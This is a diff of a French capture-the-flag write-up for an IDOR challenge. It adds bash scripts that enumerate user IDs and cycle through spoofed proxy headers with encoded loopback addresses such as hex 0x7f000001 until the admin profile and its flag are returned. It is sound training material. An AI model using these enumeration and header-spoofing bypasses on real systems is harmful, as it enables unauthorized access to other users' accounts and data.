@@ -1,4 +1,4 @@
-Mon write up pour le challenge IDOR sur le HackTonLycée 2025 :
+  Mon write up pour le challenge IDOR sur le HackTonLycée 2025 :
 
 Petit rappel : Qu'est-ce qu'un IDOR premièrement, c'est primordial de le savoir ici.
 
@@ -10,19 +10,288 @@ Donc tu peux ouvrir le casier n°572 même si tu n'es que le numéro 1 ( Notre c
 Étape 1 : Après avoir cliqué sur le liens du challenge nous arrivons sur une page sur laquelle nous voyons "mon profil", après avoir cliqué dessus on se rend compte
 l'identifiant utilisateur est passé en paramètre ici : http://15.236.204.114:1237/profile.php?id=1
 
-En testant une via un curl basique nous obtenons 
+on va déja faire une boucle bash pour tester tout les id de 1 a 600 et gardé uniquement ceux qui renvoient un 403/200
+
+    #!/bin/bash
+
+    echo "Scanners IDs 1-600 for 200/403 responses... on the IDOR challenge"
+
+    for id in {1..600}; do
+        response=$(curl -s -o /dev/null -w "%{http_code}" "http://15.236.204.114:1237/profile.php?id=$id")
+    
+        if [ "$response" -eq 200 ] || [ "$response" -eq 403 ]; then
+            # Récupérer un extrait du contenu pour voir le message
+            content=$(curl -s "http://15.236.204.114:1237/profile.php?id=$id" | head -n 5)
+            echo "ID: $id → HTTP: $response"
+            echo "   Content preview: $content"
+            echo "---"
+        fi
+    
+        # Progress indicator
+        if [ $((id % 50)) -eq 0 ]; then
+            echo "Progression: $id/600"
+        fi
+    done
+
+    echo "Scan finish"
+
+On peut apercevoire des 200 OK jusqu'à la 572 qui stop le script :
+ID: 572 → HTTP: 403
+   Content preview: 403 Forbidden - Access to administrator profile requires special header
+---
+Maintenant nous avons l'id de l'admin et là est la clé du challenge 
+
+Evidemment on va aller se renseigner sur Internet sur les méthodes possible via un header
+après avoir trouver un document nous voyons plusieurs section très interéssante :
+  - Headers Customisés
+  - Headers de proxy
+  - Headers de Session
+  - User-Agent 
+  - Case sensitivity
+  - Headers multiples etc etc
+
+dans cette liste un seul va retenir notre attention le fameux header de proxy :
+
+#!/bin/bash
+
+URL="http://15.236.204.114:1237/profile.php?id=572"
+IP="127.0.0.1"
+
+echo "Testing proxy headers on admin ID 572..."
+
+# Liste des headers proxy à tester
+headers=(
+    "X-Forwarded-For: $IP"
+    "X-Real-IP: $IP"
+    "X-Client-IP: $IP"
+    "X-Originating-IP: $IP"
+    "X-Remote-IP: $IP"
+    "X-Remote-Addr: $IP"
+    "X-Forwarded-Host: $IP"
+    "X-Host: $IP"
+    "Forwarded: for=$IP"
+    "Forwarded: $IP"
+    "X-ProxyUser-Ip: $IP"
+    "Client-IP: $IP"
+    "True-Client-IP: $IP"
+    "CF-Connecting-IP: $IP"
+    "X-Cluster-Client-IP: $IP"
+    "Via: $IP"
+    "Origin: $IP"
+    "Referer: http://$IP"
+    "X-Forwarded-Proto: http"
+    "X-Forwarded-By: $IP"
+)
+
+for header in "${headers[@]}"; do
+    echo "Testing: $header"
+    response=$(curl -s -H "$header" -w " | HTTP:%{http_code}" "$URL")
+    echo "Response: $response"
+    
+    # Vérifier si on a trouvé quelque chose d'intéressant
+    if echo "$response" | grep -q -E "flag{"; then
+        echo ">>> POSSIBLE SUCCESS WITH: $header <<<"
+    fi
+    echo "---"
+done
+
+echo "Headers test is finish"
+
+le script nous renvoient que des 403 nous allons donc test cette fois avec différents encodage , il y a surement un filtre côté serveur !
+
+#!/bin/bash
+
+URL="http://15.236.204.114:1237/profile.php?id=572"
+IP="127.0.0.1"
+
+echo "Testing proxy headers on admin ID 572..."
+
+# Liste des headers proxy à tester avec différents encodages
+headers=(
+    # Encodage basique
+    "X-Forwarded-For: $IP"
+    "X-Real-IP: $IP"
+    "X-Client-IP: $IP"
+    
+    # Hexadécimal simple
+    "X-Forwarded-For: 7f000001"
+    "X-Real-IP: 7f000001"
+    "X-Client-IP: 7f000001"
+    
+    # Hexadécimal avec préfixe 0x
+    "X-Forwarded-For: 0x7f000001"
+    "X-Real-IP: 0x7f000001" 
+    "X-Client-IP: 0x7f000001"
+    
+    # Base64
+    "X-Forwarded-For: MTI3LjAuMC4x"
+    "X-Real-IP: MTI3LjAuMC4x"
+    "X-Client-IP: MTI3LjAuMC4x"
+    
+    # Décimal long
+    "X-Forwarded-For: 2130706433"
+    "X-Real-IP: 2130706433"
+    "X-Client-IP: 2130706433"
+    
+    # Octal
+    "X-Forwarded-For: 0177.0.0.1"
+    "X-Real-IP: 0177.0.0.1"
+    "X-Client-IP: 0177.0.0.1"
+    
+    # URL encodée
+    "X-Forwarded-For: 127%2E0%2E0%2E1"
+    "X-Real-IP: 127%2E0%2E0%2E1"
+    "X-Client-IP: 127%2E0%2E0%2E1"
+    
+    # IPv6 localhost
+    "X-Forwarded-For: ::1"
+    "X-Real-IP: ::1"
+    "X-Client-IP: ::1"
+    
+    # IPv6 
+    "X-Forwarded-For: 0000:0000:0000:0000:0000:0000:0000:0001"
+    "X-Real-IP: 0000:0000:0000:0000:0000:0000:0000:0001"
+    "X-Client-IP: 0000:0000:0000:0000:0000:0000:0000:0001"
+    
+    # Localhost variantes
+    "X-Forwarded-For: localhost"
+    "X-Real-IP: localhost"
+    "X-Client-IP: localhost"
+    
+    # Hex avec points
+    "X-Forwarded-For: 0x7f.0x00.0x00.0x01"
+    "X-Real-IP: 0x7f.0x00.0x00.0x01"
+    "X-Client-IP: 0x7f.0x00.0x00.0x01"
+    
+    # Decimal avec points
+    "X-Forwarded-For: 127.0.0.1"
+    "X-Real-IP: 127.0.0.1"
+    "X-Client-IP: 127.0.0.1"
+    
+    # Autres headers proxy
+    "X-Originating-IP: $IP"
+    "X-Remote-IP: $IP"
+    "X-Remote-Addr: $IP"
+    "Forwarded: for=$IP"
+    "True-Client-IP: $IP"
+    "CF-Connecting-IP: $IP"
+    "X-Cluster-Client-IP: $IP"
+)
+
+success_found=false
+
+for header in "${headers[@]}"; do
+    echo "Testing: $header"
+    response=$(curl -s -H "$header" -w " | HTTP:%{http_code}" "$URL")
+    echo "Response: $response"
+    
+    # Vérifier si on a trouvé le flag
+    if echo "$response" | grep -q -E "flag{"; then
+        echo "SUCCESS WITH: $header "
+        echo "FULL RESPONSE:"
+        curl -s -H "$header" "$URL"
+        success_found=true
+        break
+    # Vérifier les réponses sont interessantes
+    elif echo "$response" | grep -q -E "admin|success|granted|welcome|panel"; then
+        echo "INTERESTING RESPONSE WITH: $header"
+    fi
+    echo "---"
+done
+
+if [ "$success_found" = false ]; then
+    echo "No flag found with standard headers. Testing combinations..."
+    
+    # Tester des combinaisons de headers
+    combinations=(
+        "-H \"X-Forwarded-For: 7f000001\" -H \"X-Real-IP: 127.0.0.1\""
+        "-H \"X-Forwarded-For: 127.0.0.1\" -H \"X-Client-IP: 7f000001\""
+        "-H \"X-Forwarded-For: localhost\" -H \"X-Real-IP: 127.0.0.1\""
+    )
+    
+    for combo in "${combinations[@]}"; do
+        echo "Testing combination: $combo"
+        response=$(curl -s $combo -w " | HTTP:%{http_code}" "$URL")
+        echo "Response: $response"
+        
+        if echo "$response" | grep -q -E "flag{"; then
+            echo "SUCCESS WITH COMBINATION: $combo "
+            curl -s $combo "$URL"
+            break
+        fi
+        echo "---"
+    done
+fi
+
+echo "Headers test is finish"
+
+et nous trouvons notre flag avec l'encodage hex avec préfixe 0x 0x7f000001 :
+
+ | HTTP:200
+SUCCESS WITH: X-Forwarded-For: 0x7f000001
+FULL RESPONSE:
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Profile - IDOR Challenge</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-brand">IDOR Challenge</div>
+            <div class="nav-links">
+                <a href="dashboard.php" class="nav-link">Dashboard</a>
+                <a href="profile.php?id=1" class="nav-link">My Profile</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container">
+        <header>
+            <h1>User Profile</h1>
+            <p>Viewing profile of administrator</p>
+        </header>
+
+        <div class="card">
+            <div class="profile-info">
+                <div class="profile-field">
+                    <label>User ID:</label>
+                    <span>572</span>
+                </div>
+                <div class="profile-field">
+                    <label>Username:</label>
+                    <span>administrator</span>
+                </div>
+                <div class="profile-field">
+                    <label>Email:</label>
+                    <span>admin@challenge.com</span>
+                </div>
+                <div class="profile-field">
+                    <label>Role:</label>
+                    <span>admin</span>
+                </div>
+
+                                <div class="flag-section">
+                    <h3>🎉 Congratulations!</h3>
+                    <div class="flag">
+                        <strong>Flag:</strong> flag{1d0r_w1th_h34d3r_byp455_ftw}                    </div>
+                    <p>You successfully found the administrator profile!</p>
+                </div>
+                            </div>
+
+            <div class="actions">
+                <a href="dashboard.php" class="btn">Back to Dashboard</a>
+                                    <a href="profile.php?id=1" class="btn secondary">View My Profile</a>
+                            </div>
+        </div>
+
+    </div>
+</body>
+</html>
+Headers test is finish
 
 ┌──(szzaps㉿vulnhub)-[~]
-└─$ curl "http://15.236.204.114:1237/profile.php?id=572"
-403 Forbidden - Access to administrator profile requires special header
-
-Evidemment le test en base64 et sans encodage n'est pas concluant car c'est détécté par le filtre
-
-
-┌──(szzaps㉿vulnhub)-[~]
-└─$ curl -H "X-Forwarded-For: 127.0.0.1" "http://15.236.204.114:1237/profile.php?id=572"
-403 Forbidden - Access to administrator profile requires special header
-
-┌──(szzaps㉿vulnhub)-[~]
-└─$ curl -H "X-Forwarded-For: MTI3LjAuMC4x" "http://15.236.204.114:1237/profile.php?id=572"
-403 Forbidden - Access to administrator profile requires special header
+└─$ Bref super challenge !
